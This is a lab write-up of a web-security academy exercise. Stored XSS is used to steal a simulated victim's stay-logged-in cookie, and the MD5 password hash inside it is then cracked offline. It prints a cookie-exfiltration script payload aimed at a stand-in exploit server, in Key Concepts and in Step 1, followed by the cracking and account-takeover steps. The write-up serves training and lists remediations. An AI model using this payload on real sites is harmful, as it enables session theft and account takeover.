# Lab 10: Offline Password Cracking

**Category:** Authentication
**Difficulty:** Practitioner
**Lab link:** [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

## Overview

The stay-logged-in cookie uses the same `base64(username:md5(password))` format as Lab 9. The lab also has a stored XSS vulnerability in blog comments. An attacker injects a payload that exfiltrates the victim's cookie to an exploit server, decodes it to get the MD5 hash, cracks it offline, then logs in as carlos and deletes their account.

## Key Concepts

- **Stored XSS for cookie theft:** injecting `<script>document.location='https://exploit/'+document.cookie</script>` in a comment causes any visitor (including carlos's simulated browser) to send their cookie to the attacker.
- **Offline hash cracking:** once you have `carlos:md5hash`, crack it at crackstation.net or with hashcat/john — common passwords crack instantly.
- **Cookie format:** same as Lab 9 — `base64(username:md5(password))`.

## Solution

### Step 1 — Post XSS payload in a comment

Post a comment on any blog post with the name/comment field containing:
```html
<script>document.location='https://<exploit-server>/exploit?c='+document.cookie</script>
```

### Step 2 — Capture carlos's cookie

Carlos's simulated browser visits the blog and triggers the XSS. Check the exploit server's access log for the request containing the `stay-logged-in` cookie value.

### Step 3 — Decode and crack

Base64-decode the cookie:
```
base64_decode(value) → carlos:26323c16d5f4dabff3bb136f2460a943
```
Submit the MD5 hash to [crackstation.net](https://crackstation.net) → retrieves the password.

### Step 4 — Log in and delete account

Log in as carlos with the cracked password. Navigate to `/my-account` and click **Delete account**. Lab solved.

## Remediation

- Use opaque random tokens for stay-logged-in functionality.
- Apply `HttpOnly` flag to cookies to prevent JavaScript access.
- Sanitize HTML in user-generated content to prevent stored XSS.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/authentication/lab-10-offline-password-cracking/solve.py)

This lab requires manual steps (exploit server + crackstation). The script handles the final step: logging in as carlos with a known password and deleting the account.

## Key Takeaways

- `HttpOnly` cookie flag is essential — it prevents XSS from accessing session cookies.
- Cookie theft + offline cracking chains two separate vulnerabilities into full account takeover.
- MD5 hashes of common passwords crack in milliseconds — always use bcrypt/scrypt/argon2 with a salt.
